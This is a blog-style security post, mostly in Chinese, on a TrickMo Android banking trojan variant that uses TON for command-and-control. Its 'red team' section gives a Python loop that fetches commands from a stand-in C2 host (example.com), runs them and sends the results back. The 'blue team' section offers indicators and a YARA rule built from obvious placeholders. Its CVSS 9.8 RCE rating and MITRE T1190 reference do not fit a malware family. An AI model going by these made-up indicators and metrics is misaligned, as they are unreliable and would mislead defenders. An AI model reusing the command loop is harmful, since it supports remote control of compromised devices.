---
layout: post
title:  "New TrickMo Variant Uses TON C2 and SOCKS5 to Create Android Network Pivots"
date:   2026-05-12 14:03:02 +0000
categories: [security]
severity: critical
---

# 🚨 解析 TrickMo Android Banking Trojan 的新變種：利用 TON 進行 C2 通信

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: TON (The Open Network), SOCKS5 Proxy, SSH Tunnelling

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: TrickMo Android Banking Trojan 的新變種利用 TON 進行 C2 通信，繞過傳統的 DNS 和公網基礎設施。
* **攻擊流程圖解**:
  1. 使用者安裝受駭的應用程式 (Dropper App)
  2. Dropper App 下載並安裝 TrickMo Malware
  3. TrickMo Malware 啟動 TON Proxy 並與 C2 伺服器建立連接
  4. C2 伺服器發送命令給 TrickMo Malware
  5. TrickMo Malware 執行命令並將結果傳回 C2 伺服器
* **受影響元件**: Android 5.0 以上版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受駭的 Android 裝置必須具有網路連接
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # TrickMo Malware 的 C2 伺服器地址
    c2_server = "https://example.com/c2"
    
    # TrickMo Malware 的 TON Proxy 地址
    ton_proxy = "http://localhost:8080"
    
    # 建立連接到 C2 伺服器
    response = requests.get(c2_server, proxies={"http": ton_proxy})
    
    # 執行 C2 伺服器發送的命令
    if response.status_code == 200:
        command = response.json()["command"]
        # 執行命令並將結果傳回 C2 伺服器
        result = execute_command(command)
        requests.post(c2_server, json={"result": result})
    
    ```
* **繞過技術**: TrickMo Malware 利用 TON Proxy 來繞過傳統的 DNS 和公網基礎設施，難以被偵測和攔截

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /data/data/com.example.app/files |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule TrickMo_Malware {
        meta:
            description = "TrickMo Android Banking Trojan"
            author = "Your Name"
        strings:
            $ton_proxy = "http://localhost:8080"
            $c2_server = "https://example.com/c2"
        condition:
            all of them
    }
    
    ```
* **緩解措施**: 更新 Android 系統和應用程式至最新版本，啟用 Google Play Protect 和其他安全功能

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **TON (The Open Network)**: 一種去中心化的區塊鏈網絡，允許用戶進行點對點的交易和通信。
* **SOCKS5 Proxy**: 一種代理伺服器，允許用戶通過代理伺服器訪問網際網路。
* **SSH Tunnelling**: 一種技術，允許用戶通過 SSH 連接建立隧道，繞過防火牆和其他安全措施。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/new-trickmo-variant-uses-ton-c2-and.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


